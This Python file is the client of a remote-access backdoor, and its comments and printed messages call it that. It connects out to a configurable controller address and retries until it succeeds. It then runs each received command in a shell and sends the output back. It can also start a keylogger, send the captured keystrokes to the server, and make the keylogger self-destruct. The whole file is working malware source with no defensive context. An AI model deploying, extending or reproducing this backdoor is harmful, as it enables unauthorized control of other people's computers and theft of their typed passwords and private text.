import socket, json, os, sys, subprocess, threading, time
import keylogger

#connection variables. I.e. who are you targeting.
targetIP = "127.0.0.1"
port = 6969
target = targetIP, port
keylog = None

##############################################################
#send, receive, and shell functionality

#controller for recv_command(), send_command(), and shell functionality. Call this one
"""
The execute_shell function is intended to open up a shell and pass the requested commands into it. 
To handle some of the various commands simultaneously, threading is used for 3 different commands
Keylog_start initializes a keylogger object and starts it on a thread. Output location listed inside the keylogger file
Keylog_dump starts a thread to handle the keylog.readkeys() function from the keylogger class. It passes back a string which is later dumped to a file
Keylog_stop starts a thread to handle the self_destruct function, then calls it natively once more for good measure
Other commands are run as you would expect within a shell. Sending 'quit' will exit the backdoor and end the session

"""
def execute_shell():
    while True:
        print("WAITING FOR COMMAND...")
        command = recv_command()
        print("Command recieved: ", command)

        try:
            #Special instructions are required to change directory. Will print the pwd after command
            if command[:3] == 'cd ':
                if os.path.isdir(command[3:]):
                    os.chdir(command[3:])
                    pwd = json.dumps('pwd')
                    pwd = pwd.encode()
                    execute = subprocess.Popen(pwd, shell=True, stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    result = execute.stdout.read() + execute.stderr.read()
                    result = result.decode()
                    print (result)
                    send_command(result)
                    
                #In case of incorrect directory. This block saves the connection state
                else:
                    print("Invalid Directory...")
                    send_command("Invalid Directory...")

            #Initializes the imported keylogger and begins functionality on a seperate thread.
            elif command[:12] == 'keylog_start':
                keylog = keylogger.Keylogger()
                t = threading.Thread(target=keylog.start)
                t.start()
                send_command('[+] Keylogger started..')
            #Sends cached keys to the server
            elif command[:11] == 'keylog_dump':
                t2 = threading.Thread(target=send_command(keylog.readkeys()))
                t2.start()
            #deletes keylogger cache and ends process
            elif command[:11] == 'keylog_stop':
                t3 = threading.Thread(target=keylog.self_destruct)
                t3.start()
                keylog.self_destruct()
                send_command('[-] Keylogger self destructed..')
    
            else:
                execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()
                result = result.decode()
                print (result)
                send_command(result)
        except Exception as e:
            print (e.args)


        if command == 'quit':
            break

#basic command sending
"""
The send_command function is identical to the send_command function on server.
Data is encoded to json and sent via socket connection
"""
def send_command(data):
    jsondata = json.dumps(data)
    backDoor_scock.sendall(jsondata.encode())

#basic command  receiving
"""
The recv_command function is identical to the recv_command function on server.
Data is decoded from json. stripped, and returned
"""
def recv_command():
    data = ''
    while True:
        try:
            data = data + backDoor_scock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
##############################################################


##############################################################
#socket creation and connection establishment
"""
This section is essentially the same as the server. A socket object is created, and a while loop is entered
It will try to connect to the server wherever possible, and will loop until a failure happens.
If there is ever a true failure, an exception will catch, the socket will close, and exit code 1 is sent. 
"""
try:
    backDoor_scock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket object
    print ("Socket creation passed...")
    print("Waiting for server...")
    while True:
        try:
            backDoor_scock.connect(target)
            break
        except:
            time.sleep(3)
            pass

    print ("Connection established")
except Exception as e:
    print("Backdoor socket creation failed. Exiting...")
    print(e.args)
    backDoor_scock.close()
    exit(1)
##############################################################


#test driver 2
# This once again just cleans up the UI a little bit
try:
    print("\n***BACKDOOR ESTABLISHED***\n")
    execute_shell()
    print("\n***BACKDOOR CLOSING***\n")
    backDoor_scock.close()
except Exception as e:
    print (e.args)
##############################################################
